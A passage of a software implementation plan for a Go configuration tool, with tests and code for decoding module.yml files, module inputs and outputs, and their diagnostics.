written on, before anything is fetched — Parse takes an origin because its
diagnostics want a line, and stage 2 is the only stage that has one. Parse is
pure, so stage 2 still touches neither the filesystem nor the network.

ModuleLoadDecl.Source is the PARSED source rather than the text, so stage 5 hands
it to Cache.Resolve without parsing and therefore cannot report a bad source a
second time.

A resource name is now required to be an identifier. A name IS an address and an
address is a state key, and Address.String() returns Name verbatim at the root —
so a resource named \`module.prod.database\` validates clean today and writes the
key a resource inside module instance \`prod\` will write once modules land. Such
a state file is unambiguous today and ambiguous the moment the first module
ships, which makes M5 the last milestone where the fix is a diagnostic rather
than a migration. It is the reference-grammar guard's collision through the
declaration door; neither path reaches the other.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>" \
  -- internal/config/decode_modules.go internal/config/decode_modules_test.go \
     internal/config/declarations.go internal/config/decode.go
```

---

---

## Task 3 — stage 2 decodes a module FILE

**Land this after Task 2.** It calls `decodeModuleLoads` and reuses `identifierSegment`,
both of which Task 2 creates, and its source diagnostic references `ModuleFileName`, which
this task declares. If `internal/config/decode_modules.go` does not exist, Task 2 has not
landed — stop and say so rather than writing a second copy of either.

**`ModuleFile` is fixed by contract Amendment 6a** and is unchanged by Amendment 8, except
that its `Modules` field now holds `[]ModuleLoadDecl`. Do not add fields to it.

### Why this task exists

A module is a directory containing **`module.yml`**, not `infra.yml`, and Amendment 1
records that as a confirmed product-API decision. The consequence that shapes this task:

> The two documents are different shapes, and different names make them distinguishable by
> construction rather than by validation.

A project file has `project:` and no `inputs:`/`outputs:`. A module file has
`inputs:`/`outputs:` and no `project:` — `PLAN.md` §11.3 states it directly: a module file
may NOT declare `project:`, `environments:` or `variables:`. **Neither decoder accepts the
other's keys, and that absence is the feature** — each of those falls out of the unknown-key
diagnostic, which already names the key and the line, instead of needing four bespoke
rejection rules that would each say less. So: do not add `inputs:` or `outputs:` handling to
`decodeDocument`, and do not add a `project:` or `environments:` case to `DecodeModule`.

**Modules nest** (§11.3, spec §7.2 — recursion is BOUNDED at depth 32, not forbidden), so a
module file carries a `modules:` list of its own and it goes through Task 2's
`decodeModuleLoads`, not a second decoder. Without that field, depth is always 1, Ruling 6's
depth-32 bound can never fire and its cycle detector has no reachable input.

Two remaining hazards are real silent-wrong-value shapes rather than tidiness:

1. **A module input's diagnostics must say "input".** Reusing `decodeVariable` is required —
   Ruling 3 types inputs through `variables.Schemas`, which takes `[]config.VariableDecl`,
   and §11.3 says `inputs:` is spelled exactly as §9's `variables:` — but reusing it
   unchanged tells a user with a broken input in `modules/net/module.yml` that a `variable`
   is wrong and that they should fix it in `variables.yml`, a file with nothing to do with
   their problem. The noun and the "supply it here instead" advice are threaded through as a
   parameter, with the variable call site passing exactly the strings it produces today.

2. **`outputs: {endpoint: {value: service.endpoint}}` written BARE.** Decoded as an ordinary
   value, `service.endpoint` is that literal string, and the module publishes that text to
   its caller with nothing printed. Guessing the other way is worse: `value: production` is
   an ordinary literal output, and so is a dotted version or hostname, so a rule reading any
   dotted scalar as a reference makes every dotted literal ambiguous. Contract Amendment 4e
   ruled the bare form **refused with a diagnostic giving both working spellings**, and
   `PLAN.md` §11.3 has since been rewritten to show `value: ${service.endpoint}`.

### Files

| Action | Path |
|--------|------|
| create | `internal/config/module_file.go` |
| create | `internal/config/module_file_test.go` |
| modify | `internal/config/load.go` — `ModuleFileName`, `FileModule`, `FileKind.String`, `LoadModule` |
| modify | `internal/config/decode.go` — `decodeResources` writes through a `*[]*ResourceDecl`; `declNoun` threaded through `decodeVariable`, `decodeBound`, `coerceBound`, `decodeDefault`; `topLevelShapeDetail` gains a `FileModule` case |

### Interfaces

**Consumes (from HEAD and Task 2):**

```go
// internal/config — helpers REUSED, not reimplemented
func requireScalar(path, what string, node *yaml.Node, ds *diag.Diagnostics) (string, bool)
func decodeValue(path, what string, node *yaml.Node, ds *diag.Diagnostics) (value.Value, bool)
func documentRoot(n *yaml.Node) *yaml.Node
func originOf(path string, n *yaml.Node) value.Origin
func describeOrigin(o value.Origin) string
func topLevelShapeDetail(f File) string
type ModuleLoadDecl struct { Name string; Source source.Source; Origin value.Origin }
func decodeResources(path string, node *yaml.Node, out *ProjectDecl, ds *diag.Diagnostics, seen map[string]value.Origin)  // signature changes here
func loadOptionalFile(path string, kind FileKind, environment string) (File, bool, error)

// from Task 2 — CALLED and REUSED by this task, never reimplemented
func decodeModuleLoads(path string, node *yaml.Node, dst *[]ModuleLoadDecl, ds *diag.Diagnostics, seen map[string]loadedName)
func identifierSegment(s string) bool
type ModuleLoadDecl struct { Name string; Source source.Source; Origin value.Origin }
type loadedName struct { source string; origin value.Origin }

// internal/variables — what makes reusing VariableDecl load-bearing (Ruling 3)
func Schemas(decls []config.VariableDecl) (map[string]Schema, diag.Diagnostics)
```

**Produces — contract Amendment 6a, plus the loader it calls for:**

```go
// internal/config
const ModuleFileName = "module.yml"
const FileModule FileKind = ...   // appended after FileEnvironment

func LoadModule(dir string) (File, error)                      // stage 1, one module source
func DecodeModule(f File) (*ModuleFile, diag.Diagnostics)      // stage 2, one module file

// OutputDecl is one entry of a module's own `outputs:` block.
type OutputDecl struct {
    Name           string
    Value          value.Value
    HasExpressions bool
    Origin         value.Origin
}

// ModuleFile is a decoded module.yml.
type ModuleFile struct {
    Inputs    []VariableDecl    // sorted by Name
    Resources []*ResourceDecl   // sorted by Name
    Modules   []ModuleLoadDecl  // sorted by Name — MODULES NEST
    Outputs   []OutputDecl      // sorted by Name
    Origin    value.Origin
}
```

Stage 5 calls `LoadModule` then `DecodeModule` per source and never handles a `yaml.Node`
itself — Ruling 2's intent, through the module-specific door Amendment 1 refines it to.

`LoadModule` takes an **already-resolved directory**. Turning a `source:` into a directory —
joining a relative path against the file that named it, or fetching and caching a git
remote — is `internal/modules/source.Cache.Resolve`'s job (Amendment 10). `ModuleFile.Origin.File`
is the decoded file's path, which is what stage 5 takes that directory from; there is
deliberately no separate `Path` field.

`ModuleFile.Inputs` is `[]VariableDecl` so stage 5 types a module's inputs with
`variables.Schemas(mf.Inputs)` — the existing checker, unchanged, as Ruling 3 requires. **The
two shapes do not diverge**: §11.3 says `inputs:` is spelled exactly as §9's `variables:`,
same `type`, same `default`, same bounds.

`OutputDecl` has no `ValueOrigin` field and does not need one: `decodeValue` stamps the value
node's position onto the value it returns, so **`OutputDecl.Value.Origin` already points at
the expression** while `OutputDecl.Origin` points at the output's name.

**There is no resource/module name collision check.** Under Amendment 8 a module name is only
ever half of a resource type (`module.app`) and never a bare name, so a module loaded as
`app` and a resource called `app` are in different namespaces and do not collide. Contract
Amendment 4d, which put such a check at stage 2, is void along with the model that needed it.

### Steps

#### 3.1 — Write the failing tests

Create `internal/config/module_file_test.go`:

```go
package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/infrata/infrata/pkg/value"
)

// writeModule writes one module.yml into a temp directory and loads it, so every
// test below goes through the same LoadModule path stage 5 will.
func writeModule(t *testing.T, body string) File {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, ModuleFileName), []byte(body), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}
	f, err := LoadModule(dir)
	if err != nil {
		t.Fatalf("LoadModule: %v", err)
	}
	return f
}

// TestDecodeModuleFile is the happy path over PLAN.md §11.3's own example.
//
// Every block is written in the WRONG order — "replicas" before
// "application_name", "service" before "cache", "url" before "endpoint" — so an
// implementation that preserves document order, or leaves order to a map, fails.
// A fixture already sorted would pass against code that does no sorting and would
// look tidier, which is why it is not used.
func TestDecodeModuleFile(t *testing.T) {
	f := writeModule(t, `
inputs:
  replicas:
    type: integer
    default: 1
  application_name:
    type: string

resources:
  service:
    type: test.database
    engine: postgres
    count: ${replicas}
  cache:
    type: test.network
    cidr: 10.0.0.0/16

outputs:
  url:
    value: ${service.endpoint}
  endpoint:
    value: ${cache.id}
`)
	got, ds := DecodeModule(f)
	requireNoErrors(t, ds)

	if got.Origin.File != f.Path {
		t.Errorf("Origin.File = %q, want %q: stage 5 resolves a nested source against its directory",
			got.Origin.File, f.Path)
	}

	if len(got.Inputs) != 2 {
		t.Fatalf("decoded %d inputs, want 2", len(got.Inputs))
	}
	if got.Inputs[0].Name != "application_name" || got.Inputs[1].Name != "replicas" {
		t.Errorf("inputs are not sorted by name: %s, %s", got.Inputs[0].Name, got.Inputs[1].Name)
	}
	if got.Inputs[1].Type != value.KindInt || !got.Inputs[1].HasDefault {
		t.Errorf("replicas = %+v, want an integer with a default", got.Inputs[1])
	}
	if n, _ := got.Inputs[1].Default.AsInt(); n != 1 {
		t.Errorf("replicas default = %v, want 1", got.Inputs[1].Default.Raw)
	}
	if got.Inputs[0].Type != value.KindString {
		t.Errorf("application_name type = %v, want string", got.Inputs[0].Type)
	}

	if len(got.Resources) != 2 {
		t.Fatalf("decoded %d resources, want 2", len(got.Resources))
	}
	if got.Resources[0].Name != "cache" || got.Resources[1].Name != "service" {
		t.Errorf("resources are not sorted by name: %s, %s", got.Resources[0].Name, got.Resources[1].Name)
	}
	if got.Resources[1].Type != "test.database" {
		t.Errorf("service type = %q", got.Resources[1].Type)
	}
	if !got.Resources[1].Attributes["count"].HasExpressions {
		t.Error("${replicas} inside a module resource was not flagged as an expression")
	}

	if len(got.Outputs) != 2 {
		t.Fatalf("decoded %d outputs, want 2", len(got.Outputs))
	}
	if got.Outputs[0].Name != "endpoint" || got.Outputs[1].Name != "url" {
		t.Errorf("outputs are not sorted by name: %s, %s", got.Outputs[0].Name, got.Outputs[1].Name)
	}
	if !got.Outputs[1].HasExpressions {
		t.Error("url's ${service.endpoint} was not flagged as an expression")
	}
	if s, _ := got.Outputs[1].Value.AsString(); s != "${service.endpoint}" {
		t.Errorf("url value = %q, want the text kept verbatim for stage 5 to parse", s)
	}
	// The value's own Origin is what a diagnostic about the EXPRESSION points
	// at; OutputDecl.Origin points at the output's name. Both are needed and
	// they are different lines, which is why OutputDecl carries no third field.
	if got.Outputs[1].Value.Origin.Line == got.Outputs[1].Origin.Line {
		t.Errorf("the value's origin (line %d) is the name's origin; a diagnostic about the expression would point at the wrong line",
			got.Outputs[1].Value.Origin.Line)
	}
}

// TestModuleInputDiagnosticsSayInputNotVariable is the discriminating test for
// the noun threading.
//
// The fixture reaches decodeVariable's "must specify at least" guard: an empty
// mapping is a valid mapping, so the body check passes, the key loop runs zero
// times, no type and no default are recorded, and nothing has already been
// reported — exactly the state that guard fires on.
//
// The negative assertions are the point. Without them this passes against code
// that says "variable "replicas" ... input ..." in one sentence.
func TestModuleInputDiagnosticsSayInputNotVariable(t *testing.T) {
	f := writeModule(t, `
inputs:
  replicas: {}
`)
	_, ds := DecodeModule(f)
	d := requireErrorAbout(t, ds, `input "replicas" must specify at least a `+"`type`")
	text := d.Summary + " | " + d.Detail + " | " + d.Action
	if strings.Contains(text, "variable") || strings.Contains(text, "Variable") {
		t.Errorf("a module input's diagnostic calls it a variable: %s", text)
	}
	if strings.Contains(text, VariablesFileName) {
		t.Errorf("a module input's diagnostic sends the user to %s, which cannot supply it: %s", VariablesFileName, text)
	}
	if !strings.Contains(text, "instantiates") {
		t.Errorf("the suggested action does not say where an input's value comes from: %s", text)
	}
}

// TestModuleInputTypeErrorsSayInput covers the other two places the noun appears,
// each with a fragment unique to its own diagnostic.
func TestModuleInputTypeErrorsSayInput(t *testing.T) {
	t.Run("unknown type", func(t *testing.T) {
		f := writeModule(t, "inputs:\n  replicas:\n    type: intger\n")
		_, ds := DecodeModule(f)
		d := requireErrorAbout(t, ds, `unknown input type "intger"`)
		if strings.Contains(d.Detail, "Variable") {
			t.Errorf("detail calls a module input a variable: %s", d.Detail)
		}
	})

	t.Run("bound on a non-numeric type", func(t *testing.T) {
		f := writeModule(t, "inputs:\n  name:\n    type: string\n    min: 3\n")
		_, ds := DecodeModule(f)
		d := requireErrorAbout(t, ds, "`min` is not valid on input \"name\"")
		if strings.Contains(d.Detail, "Variable") {
			t.Errorf("detail calls a module input a variable: %s", d.Detail)
		}
	})
}

// TestProjectVariableWordingIsUnchanged is the other half of the noun threading:
// the existing call site must produce byte-identical text.
//
// Asserted here rather than left to the untouched tests, because
// decode_variables_test.go does not assert on every string the threading touches,
// so a regression in one of the others would go unnoticed.
func TestProjectVariableWordingIsUnchanged(t *testing.T) {
	files := writeConfig(t, "project: myapp\n\nvariables:\n  replicas: {}\n")
	_, ds := Decode(files)
	d := requireErrorAbout(t, ds, `variable "replicas" must specify at least a `+"`type`")
	if !strings.Contains(d.Action, VariablesFileName) {
		t.Errorf("a project variable's action no longer names %s: %s", VariablesFileName, d.Action)
	}
}

// TestModuleFileRejectsProjectLevelKeysAsUnknownKeys pins Amendment 1's
// structural argument and PLAN.md §11.3's rule: the module decoder has no case
// for `project`, `environments` or `variables`, so each falls out of the
// unknown-key diagnostic — which names the key and the line, and needs no bespoke
// rule.
//
// The fragment quotes the key, so no case can be satisfied by a sibling's
// diagnostic. The detail assertion is what makes the message useful rather than
// merely present.
func TestModuleFileRejectsProjectLevelKeysAsUnknownKeys(t *testing.T) {
	cases := map[string]string{
		"project":      "project: myapp\n",
		"variables":    "variables:\n  region:\n    type: string\n",
		"environments": "environments:\n  dev: {}\n",
	}
	for key, body := range cases {
		t.Run(key, func(t *testing.T) {
			f := writeModule(t, body)
			_, ds := DecodeModule(f)
			d := requireErrorAbout(t, ds, "unknown key "+`"`+key+`"`+" in module file")
			if !strings.Contains(d.Detail, "`inputs`") || !strings.Contains(d.Detail, "`outputs`") {
				t.Errorf("detail does not name what a module file does declare: %s", d.Detail)
			}
		})
	}
}

// TestModuleFileAcceptsNestedModules. Spec §7.2 bounds recursion at 32
// instantiations rather than forbidding it and §11.3 says a module may declare
// `modules:`, so a module file carries a list of its own, decoded by Task 2's
// decoder rather than a second one. Without this, depth is always 1 and Ruling 6's
// depth bound and cycle detector have nothing to detect.
//
// The fixture writes "zeta" before "alpha" so the sort is exercised rather than
// assumed.
func TestModuleFileAcceptsNestedModules(t *testing.T) {
	f := writeModule(t, `
resources:
  outer:
    type: test.network
    cidr: 10.0.0.0/16

modules:
  - ./zeta
  - name: alpha
    source: ./inner/app-stack
`)
	got, ds := DecodeModule(f)
	requireNoErrors(t, ds)

	if len(got.Modules) != 2 {
		t.Fatalf("decoded %d nested modules, want 2", len(got.Modules))
	}
	if got.Modules[0].Name != "alpha" || got.Modules[1].Name != "zeta" {
		t.Errorf("nested modules are not sorted by name: %s, %s", got.Modules[0].Name, got.Modules[1].Name)
	}
	if got.Modules[0].Source.Location != "./inner/app-stack" {
		t.Errorf("nested location = %q", got.Modules[0].Source.Location)
	}
}

// TestNestedModuleNameCollisionIsAnError. The collision rule applies at every
// level of nesting, which is why DecodeModule keeps its own `seen` map rather
// than sharing the project's.
func TestNestedModuleNameCollisionIsAnError(t *testing.T) {
	f := writeModule(t, `
modules:
  - ./one/net
  - ./two/net
`)
	_, ds := DecodeModule(f)
	requireErrorAbout(t, ds, `two modules are both named "net"`, "./one/net", "./two/net")
}

// TestOutputShapeErrors. Each fragment is unique to its diagnostic.
func TestOutputShapeErrors(t *testing.T) {
	t.Run("outputs is a list", func(t *testing.T) {
		f := writeModule(t, "outputs:\n  - endpoint\n")
		_, ds := DecodeModule(f)
		requireErrorAbout(t, ds, "`outputs` must be a mapping of output name to declaration")
	})

	t.Run("output body is a scalar", func(t *testing.T) {
		f := writeModule(t, "outputs:\n  endpoint: ${service.endpoint}\n")
		_, ds := DecodeModule(f)
		requireErrorAbout(t, ds, `output "endpoint" must be a mapping`)
	})

	t.Run("no value", func(t *testing.T) {
		f := writeModule(t, "outputs:\n  endpoint:\n    description: the endpoint\n")
		_, ds := DecodeModule(f)
		// TWO errors here — the unknown key and the missing value — so assert on
		// the set rather than through requireErrorAbout, which insists on
		// exactly one. Both are wanted: silencing the second would leave a user
		// who typo'd `value` as `description` with no statement that the output
		// publishes nothing.
		var summaries []string
		for _, d := range ds {
			summaries = append(summaries, d.Summary)
		}
		joined := strings.Join(summaries, " | ")
		for _, want := range []string{
			`output "endpoint" has no ` + "`value`",
			`unknown key "description" in output "endpoint"`,
		} {
			if !strings.Contains(joined, want) {
				t.Errorf("diagnostics do not mention %q: %s", want, joined)
			}
		}
	})

	t.Run("duplicate output", func(t *testing.T) {
		f := writeModule(t, "outputs:\n  endpoint:\n    value: ${a.b}\n  endpoint:\n    value: ${c.d}\n")
		_, ds := DecodeModule(f)
		// The body has no leading newline, so the first `endpoint:` is line 2.
		requireErrorAbout(t, ds, `output "endpoint" is declared more than once`, "line 2")
	})
}

// TestBareOutputReferenceIsRefused checks all THREE answers, because a guard that
// only ever rejects is as wrong as one that never does.
//
// Contract Amendment 4e: `${...}` is this language's only reference syntax, with
// `$${` as its escape, so a bare scalar is a literal everywhere else. Decoded as
// an ordinary value, `service.endpoint` is that literal string and the module
// would publish it to its caller with nothing printed; read as a reference, every
// dotted literal in an output becomes ambiguous.
func TestBareOutputReferenceIsRefused(t *testing.T) {
	t.Run("bare dotted name is refused", func(t *testing.T) {
		f := writeModule(t, "outputs:\n  endpoint:\n    value: service.endpoint\n")
		_, ds := DecodeModule(f)
		d := requireErrorAbout(t, ds, `output "endpoint" names "service.endpoint" without `+"`${...}`")
		if !strings.Contains(d.Action, "${service.endpoint}") {
			t.Errorf("action does not give the reference spelling: %s", d.Action)
		}
		if !strings.Contains(d.Action, `"service.endpoint"`) {
			t.Errorf("action does not give the literal spelling: %s", d.Action)
		}
	})

	t.Run("quoted means the literal", func(t *testing.T) {
		f := writeModule(t, "outputs:\n  endpoint:\n    value: \"service.endpoint\"\n")
		got, ds := DecodeModule(f)
		requireNoErrors(t, ds)
		if s, _ := got.Outputs[0].Value.AsString(); s != "service.endpoint" {
			t.Errorf("quoted output = %q", s)
		}
	})

	t.Run("an undotted literal is fine", func(t *testing.T) {
		f := writeModule(t, "outputs:\n  tier:\n    value: production\n")
		got, ds := DecodeModule(f)
		requireNoErrors(t, ds)
		if s, _ := got.Outputs[0].Value.AsString(); s != "production" {
			t.Errorf("literal output = %q", s)
		}
	})

	t.Run("a non-string literal is fine", func(t *testing.T) {
		f := writeModule(t, "outputs:\n  replicas:\n    value: 3\n")
		got, ds := DecodeModule(f)
		requireNoErrors(t, ds)
		if n, _ := got.Outputs[0].Value.AsInt(); n != 3 {
			t.Errorf("integer output = %v", got.Outputs[0].Value.Raw)
		}
	})
}

// TestEmptyAndMalformedModuleFiles.
func TestEmptyAndMalformedModuleFiles(t *testing.T) {
	// The empty case deliberately does NOT use requireErrorAbout: that helper
	// also asserts the diagnostic has a line number, and an empty file has no
	// node tree to take one from — Decode's own "configuration file is empty" has
	// the same shape.
	t.Run("empty", func(t *testing.T) {
		f := writeModule(t, "")
		_, ds := DecodeModule(f)
		if !ds.HasErrors() {
			t.Fatal("an empty module file produced no error")
		}
		var found bool
		for _, d := range ds {
			if strings.Contains(d.Summary, "module file is empty") {
				found = true
				if d.Origin.File != f.Path {
					t.Errorf("diagnostic names %q, want %q", d.Origin.File, f.Path)
				}
			}
		}
		if !found {
			t.Errorf("no \"module file is empty\" diagnostic: %v", errorSummaries(ds))
		}
	})

	t.Run("top level is a list", func(t *testing.T) {
		f := writeModule(t, "- inputs\n")
		_, ds := DecodeModule(f)
		requireErrorAbout(t, ds, "module file must be a mapping", ModuleFileName)
	})

	t.Run("a block declared twice", func(t *testing.T) {
		f := writeModule(t, "resources:\n  a:\n    type: test.network\noutputs:\n  x:\n    value: ${a.id}\nresources:\n  b:\n    type: test.network\n")
		_, ds := DecodeModule(f)
		requireErrorAbout(t, ds, "`resources` is declared more than once in this module file", "line 1")
	})
}

// TestLoadModuleDiagnoses covers the three ways a source directory fails to name
// a module, each of which reads identically as a bare "no such file" and needs
// telling apart. These are errors rather than diagnostics for Load's own reason:
// a file that did not load has no node tree, so there is no Origin to point at.
func TestLoadModuleDiagnoses(t *testing.T) {
	t.Run("missing directory", func(t *testing.T) {
		_, err := LoadModule(filepath.Join(t.TempDir(), "absent"))
		if err == nil {
			t.Fatal("want an error for a source that does not exist")
		}
		if !strings.Contains(err.Error(), "does not exist") || !strings.Contains(err.Error(), ModuleFileName) {
			t.Errorf("error = %v", err)
		}
	})

	t.Run("source is a file", func(t *testing.T) {
		dir := t.TempDir()
		path := filepath.Join(dir, "net.yml")
		if err := os.WriteFile(path, []byte("resources: {}\n"), 0o644); err != nil {
			t.Fatalf("write: %v", err)
		}
		_, err := LoadModule(path)
		if err == nil {
			t.Fatal("want an error for a source that is a file")
		}
		if !strings.Contains(err.Error(), "not a directory") {
			t.Errorf("error = %v", err)
		}
	})

	t.Run("infra.yml where module.yml was expected", func(t *testing.T) {
		dir := t.TempDir()
		if err := os.WriteFile(filepath.Join(dir, ProjectFileName), []byte("project: x\n"), 0o644); err != nil {
			t.Fatalf("write: %v", err)
		}
		_, err := LoadModule(dir)
		if err == nil {
			t.Fatal("want an error when the directory holds infra.yml instead")
		}
		if !strings.Contains(err.Error(), "Rename") || !strings.Contains(err.Error(), ModuleFileName) {
			t.Errorf("error = %v; it must say how to turn this into a module", err)
		}
	})
}
```

Run:

```bash
go test ./internal/config/ -count=1 -run 'TestDecodeModuleFile|TestModuleInput|TestModuleFile|TestNestedModule|TestOutput|TestBareOutput|TestEmptyAndMalformed|TestLoadModule|TestProjectVariableWording'
```

**Expected failure:** a compile error, `undefined: LoadModule` (and `undefined:
ModuleFileName`, `undefined: DecodeModule`). Nothing can load or decode a module file yet.

#### 3.2 — Stage 1: the module file name, kind and loader

In `internal/config/load.go`, after `EnvironmentsDirName`:

```go
// ModuleFileName is the file a module's source directory must contain
// (PLAN.md §11.3).
//
// Deliberately NOT infra.yml, confirmed as a product-API decision (contract
// Amendment 1). A module file is a different document shape — `inputs` and
// `outputs`, no `project` — and two names make the shapes distinguishable by
// construction: neither decoder accepts the other's keys, so four bespoke
// rejection rules never have to exist. It also stops a module directory looking
// like a project: under a shared name, `infrata plan dev` run inside
// modules/networking/ would find a valid infra.yml and TRY, producing a pile of
// "variable not set" errors describing a situation that is not a mistake.
const ModuleFileName = "module.yml"
```

Add the kind at the END of the `FileKind` block, so the existing constants keep their values:

```go
	// FileModule is a module's module.yml: `inputs`, `resources`, `modules`,
	// `outputs`.
	FileModule
```

and its `String()` case, beside the others:

```go
	case FileModule:
		return "module file"
```

`topLevelShapeDetail` in `decode.go` gains a matching case, so a module file's top-level
shape diagnostic does not describe `infra.yml`:

```go
	case FileModule:
		return "The top level of " + ModuleFileName + " must be a set of keys such as `inputs`, `resources` and `outputs`."
```

Then, after `loadEnvironmentDir`:

```go
// LoadModule reads one module file (compiler stage 1), for a module's already
// resolved source directory.
//
// Separate from Load because a module directory is not a project: it has no
// infra.yml, no variables.yml and no environments/, and it has no environment of
// its own for Load's file walk to discover. Stage 5 calls this once per module
// SOURCE and hands the result to DecodeModule, which is how stage 5 loads module
// sources while never touching a yaml.Node itself (contract Ruling 2, as refined
// by Amendment 1).
//
// dir is already resolved. Turning a `source:` into a directory — joining a
// relative path against the file that named it, or fetching and caching a git
// remote — is internal/modules/source's job (Amendment 10), because only it knows
// which file named the source and where the cache lives.
//
// Failures are errors rather than diagnostics, for Load's reason: a file that did
// not load has no node tree, so there is no Origin for a diagnostic to point at.
// Each of the three cases below reads identically as a bare "no such file", which
// names the path and neither the expectation nor an action — exactly the shape
// §44 forbids.
func LoadModule(dir string) (File, error) {
	path := filepath.Join(dir, ModuleFileName)
	f, found, err := loadOptionalFile(path, FileModule, "")
	if err != nil {
		return File{}, err
	}
	if found {
		return f, nil
	}

	info, statErr := os.Stat(dir)
	switch {
	case statErr != nil && os.IsNotExist(statErr):
		return File{}, fmt.Errorf(
			"module source %s does not exist; a module `source` names a directory containing %s. "+
				"Create the directory, or correct the `source`.", dir, ModuleFileName)
	case statErr != nil:
		return File{}, statErr
	case !info.IsDir():
		return File{}, fmt.Errorf(
			"module source %s is a file, not a directory; a module `source` names a directory containing %s. "+
				"Point `source` at the directory instead.", dir, ModuleFileName)
	}

	if _, err := os.Stat(filepath.Join(dir, ProjectFileName)); err == nil {
		return File{}, fmt.Errorf(
			"module source %s contains %s but no %s; a module declares `inputs`, `resources` and `outputs` and no `project`. "+
				"Rename %s to %s.", dir, ProjectFileName, ModuleFileName, ProjectFileName, ModuleFileName)
	}

	return File{}, fmt.Errorf(
		"module source %s contains no %s. Create it with an `inputs`, `resources` and `outputs` block.",
		dir, ModuleFileName)
}
```

#### 3.3 — Make `decodeResources` write through a slice pointer

A module file's resources go into a `ModuleFile`, not a `ProjectDecl`, and one decoder must
serve both — a second copy of "decode a resources block" is the defect class that put two
spellings of one concept in this tree twice already. It also means a `module.` type inside a
module file gets Task 2's `checkResourceType` for free, which nesting needs.

In `internal/config/decode.go`, change the signature and the one append:

```go
func decodeResources(path string, node *yaml.Node, dst *[]*ResourceDecl, ds *diag.Diagnostics, seen map[string]value.Origin) {
```

```go
		*dst = append(*dst, r)
```

and its one existing call site, in `decodeDocument`:

```go
		case "resources":
			decodeResources(path, val, &out.Resources, ds, seenResources)
```

#### 3.4 — Thread the declaration noun through `decodeVariable`

Add to `internal/config/decode.go`, just above `decodeVariables`:

```go
// declNoun names what a `type`/`default`/`min`/`max` declaration declares, so ONE
// decoder serves both a project variable (PLAN.md §9) and a module input (§11.3)
// without either one's diagnostics carrying the other's advice.
//
// §11.3 says a module's `inputs:` is spelled exactly as §9's `variables:`, which
// is what makes the reuse right — but a user with a broken input in
// modules/net/module.yml must not be told a "variable" is wrong and sent to
// variables.yml, a file that has nothing to do with their problem. That is the
// §44 failure this parameter closes; a second copy of decodeVariable would close
// it by reintroducing the duplication contract Ruling 3 forbids.
type declNoun struct {
	singular string // "variable"
	titled   string // "Variable", at the start of a sentence
	// supplied is how a value reaches this kind of declaration when the
	// declaration itself does not carry one, phrased to slot into an action:
	// "... or put the value <supplied> instead."
	supplied string
}

// named renders "variable \"replicas\"" or "input \"replicas\"".
func (d declNoun) named(name string) string {
	return d.singular + " " + strconv.Quote(name)
}

var (
	variableNoun = declNoun{singular: "variable", titled: "Variable", supplied: "in " + VariablesFileName}
	inputNoun    = declNoun{
		singular: "input",
		titled:   "Input",
		supplied: "on the resource that instantiates this module",
	}
)
```

Then add `d declNoun` as the parameter before `ds` on each of these four functions, threading
it through the calls between them:

```go
func decodeVariable(path, name string, body *yaml.Node, origin value.Origin, d declNoun, ds *diag.Diagnostics) VariableDecl
func decodeBound(path, name, which string, node *yaml.Node, kind value.Kind, typeReported bool, d declNoun, ds *diag.Diagnostics) (value.Value, bool)
func coerceBound(path, name, which string, node *yaml.Node, bv value.Value, kind value.Kind, d declNoun, ds *diag.Diagnostics) (value.Value, bool)
func decodeDefault(path, name string, node *yaml.Node, kind value.Kind, d declNoun, ds *diag.Diagnostics) (value.Value, bool)
```

`decodeVariables` (the project's `variables:` block) passes `variableNoun` at its one call
site, so every existing message stays byte-identical:

```go
		out.Variables = append(out.Variables, decodeVariable(path, nameNode.Value, body, origin, variableNoun, ds))
```

Then replace the noun in the message bodies. These are the complete, exhaustive replacements
inside those four functions. Afterwards,
`grep -n '"variable \|"Variable \|VariablesFileName' internal/config/decode.go` must show no
hit between the start of `decodeVariable` and the end of `decodeDefault`:

| Old | New |
|-----|-----|
| `"variable " + strconv.Quote(name)` | `d.named(name)` |
| `"Variable " + strconv.Quote(name)` | `d.titled + " " + strconv.Quote(name)` |
| `"unknown variable type "` | `"unknown " + d.singular + " type "` |
| `"A variable declaration understands"` | `"A " + d.singular + " declaration understands"` |
| `" is set more than once on variable "` | `" is set more than once on " + d.singular + " "` |
| ``"` is not valid on variable " + strconv.Quote(name)`` | ``"` is not valid on " + d.named(name)`` |
| ``"` on variable " + strconv.Quote(name)`` | ``"` on " + d.named(name)`` |
| `" in variable " + strconv.Quote(name)` | `" in " + d.named(name)` |
| `", or put the value in " + VariablesFileName + " instead."` | `", or put the value " + d.supplied + " instead."` |
| `strconv.Quote(name) + " in " + VariablesFileName + "."` | `strconv.Quote(name) + " " + d.supplied + "."` |

The two `VariablesFileName` rows are why `supplied` carries its preposition: with
`variableNoun.supplied == "in variables.yml"` both sentences come out character for character
as they are today, which is what `TestProjectVariableWordingIsUnchanged` and the untouched
`decode_variables_test.go` verify.

#### 3.5 — Write the module file decoder

Create `internal/config/module_file.go`:

```go
package config

import (
	"sort"
	"strconv"
	"strings"

	"gopkg.in/yaml.v3"

	"github.com/infrata/infrata/internal/diag"
	"github.com/infrata/infrata/pkg/value"
)

// OutputDecl is one value a module publishes to its caller (PLAN.md §11.3).
type OutputDecl struct {
	Name string
	// Value is the output's `value:`, decoded exactly as a resource attribute
	// is: the text kept verbatim, with HasExpressions saying whether it carries
	// an interpolation. Stage 5 parses it and evaluates it in the MODULE's
	// scope, and the result may legitimately be UNKNOWN — an output usually
	// reads a computed attribute of a resource the plan has not created yet
	// (contract Ruling 5), which must stay unknown through the caller's
	// evaluation rather than collapsing to an empty string.
	//
	// Value.Origin is the `value:` node's own position, so a diagnostic about
	// the EXPRESSION points at the expression while Origin below points at the
	// output's name. That is why there is no third field.
	Value          value.Value
	HasExpressions bool
	Origin         value.Origin
}

// ModuleFile is a decoded module.yml: the module's own half of PLAN.md §11, as
// distinct from ModuleLoadDecl, which is one line in a caller's `modules:` list.
//
// Distinct from ProjectDecl: a module has no project name, no variables.yml and
// no environments (§11.3). That is enforced by construction rather than by
// validation — this decoder has no case for `project`, `variables` or
// `environments`, so each falls out of the unknown-key diagnostic, which already
// names the key and the line. Do not add bespoke cases for them; the absence is
// the feature (contract Amendment 1).
type ModuleFile struct {
	// Inputs are the module's declared inputs. §11.3: spelled exactly as §9's
	// `variables:`, same `type`, same `default`, same bounds — which is what
	// lets stage 5 type them by calling variables.Schemas(mf.Inputs), the
